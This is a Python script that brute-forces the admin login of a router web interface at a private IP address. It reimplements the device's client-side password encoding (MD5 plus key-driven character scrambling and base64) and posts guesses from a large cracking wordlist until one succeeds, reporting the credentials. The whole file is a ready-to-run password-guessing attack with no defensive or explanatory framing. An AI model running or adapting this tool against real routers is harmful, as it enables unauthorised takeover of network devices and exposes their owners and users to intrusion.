import requests
import hashlib
import time
import base64
import random
from tqdm import tqdm
import os

# Setup
router_url = "http://10.141.42.79"
login_info_url = f"{router_url}/goform/GetLoginInfo"
login_url = f"{router_url}/goform/login"

# Common usernames; consider loading from file in future
# usernames = ["admin", "root", "user", "administrator"]
usernames = ["admin"]

password_path = "/Volumes/1TB/cracking/lists/cyclone_hk.txt"

# Optimized wordlist loading
def count_lines(file_path):
    """Count the number of non-empty lines in the file"""
    count = 0
    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            if line.strip():
                count += 1
    return count

def load_wordlist(path, batch_size=1000):
    """Load passwords from wordlist in efficient batches"""
    total_passwords = count_lines(path)
    print(f"Wordlist contains {total_passwords} passwords")
    
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        passwords = []
        for line in f:
            password = line.strip()
            if password:
                passwords.append(password)
                if len(passwords) >= batch_size:
                    for pwd in passwords:
                        yield pwd
                    passwords = []
        
        # Yield any remaining passwords
        for pwd in passwords:
            yield pwd

def get_login_info():
    r = requests.get(login_info_url)
    data = r.json()
    priKey, timestamp = data["priKey"].split("x")
    return priKey, timestamp, int(time.time())

def base64_encode_custom(message):
    return base64.b64encode(message.encode()).decode()

def password_encode(password, secret, timestamp, timestamp_start):
    parse16 = int(secret, 16)
    current_arr = "1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~!@#$%^&*()_+{}|[]:;'?,./=-"

    num14 = random.randint(1, 4)
    num255 = [random.randint(0, 255) for _ in range(num14)]
    spliceStr = ''.join([current_arr[i % len(current_arr)] for i in num255])
    splicPsw = spliceStr + password

    for i in range(4):
        num = ((parse16 >> (i * 8)) & 0xff) % len(splicPsw)
        chr1 = splicPsw[num]
        chr2 = splicPsw[i % len(splicPsw)]
        splicPsw = splicPsw[:num] + chr2 + splicPsw[num+1:]
        splicPsw = splicPsw[:i % len(splicPsw)] + chr1 + splicPsw[i % len(splicPsw)+1:]

    random1 = ''.join(f"{x:02x}" for x in num255)
    endTime = int(time.time())
    time_stamp = hex(int(timestamp, 16) + (endTime - timestamp_start))[2:]

    message = f"{random1}x{time_stamp}:{splicPsw}"
    base64Str = base64_encode_custom(message)

    for i in range(4):
        num = ((parse16 >> (i * 8)) & 0xff) % len(base64Str)
        chr1 = base64Str[num]
        chr2 = base64Str[i % len(base64Str)]
        base64Str = base64Str[:num] + chr2 + base64Str[num+1:]
        base64Str = base64Str[:i % len(base64Str)] + chr1 + base64Str[i % len(base64Str)+1:]

    return base64Str

def try_login(username, raw_password):
    for _ in range(3):
        try:
            priKey, timestamp, timestamp_start = get_login_info()
            md5pass = hashlib.md5(raw_password.encode()).hexdigest()
            encoded_pass = password_encode(md5pass, priKey, timestamp, timestamp_start)

            payload = {
                "username": username,
                "password": encoded_pass
            }

            r = requests.post(login_url, json=payload, timeout=5)
            resp = r.json()
            if resp.get("retcode") == 0:
                return True
            else:
                return False
        except Exception as e:
            print(f"⚠️ Error with {username}:{raw_password} — {e} — retrying...")
            time.sleep(2)
    return False

# Main execution
if __name__ == "__main__":
    start_time = time.time()
    attempts = 0
    
    # Count total passwords for progress tracking
    total_passwords = count_lines(password_path)
    
    for username in usernames:
        # Create progress bar for brute force attempts
        with tqdm(total=total_passwords, desc=f"Brute forcing {username}", unit="pwd") as pbar:
            for password in load_wordlist(password_path):
                attempts += 1
                result = try_login(username, password)
                
                if result:
                    tqdm.write(f"✅ SUCCESS: {username}:{password}")
                    elapsed = time.time() - start_time
                    tqdm.write(f"Found after {attempts} attempts in {elapsed:.2f} seconds")
                    exit(0)
                else:
                    if attempts % 10 == 0:  # Only update display occasionally to reduce overhead
                        elapsed = time.time() - start_time
                        rate = attempts / elapsed if elapsed > 0 else 0
                        tqdm.write(f"❌ Failed: {username}:{password} | {rate:.2f} attempts/sec")
                
                pbar.update(1)
            
    print(f"Exhausted wordlist. Tried {attempts} passwords in {time.time() - start_time:.2f} seconds")
        